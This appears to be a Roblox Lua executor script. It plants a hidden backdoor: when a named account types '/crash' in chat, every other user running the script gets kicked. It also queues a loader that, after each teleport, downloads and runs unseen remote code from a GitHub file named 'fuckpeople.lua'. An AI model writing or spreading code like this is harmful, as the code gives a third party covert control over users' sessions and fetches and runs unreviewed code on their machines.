
    wait(1)
    game:GetService("Players").PlayerAdded:Connect(function(player)
        wait(1)
        game.Players.PlayerAdded:Connect(function(player)
            wait(1)
            player.Chatted:Connect(function(message)
                wait(1)
                if (player.Name == "Actinium_Ac") and message == "/crash"  then
                    if game.Players.LocalPlayer.UserId ~=
                    116781531 then
                    game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick ;)")
                    end
                end
            end)
        end)
    end)

    for _, player in ipairs(game.Players:GetPlayers()) do
        player.Chatted:Connect(function(message)
            wait(1)
            if (player.Name == "Actinium_Ac") and message == "/crash"   then
                if game.Players.LocalPlayer.UserId ~= 116781531 then
                game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick ;)")
                end
            end
        end)
    end
    queue_on_teleport([[
            if not game:IsLoaded() then game.Loaded:Wait() end
            task.wait(3)
         repeat wait(0.1) until  game.Loaded and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") 
           loadstring(game:HttpGet(("https://raw.githubusercontent.com/JustAP1ayer/ignorewtffxd/main/fuckpeople.lua"),true))()
           ]])
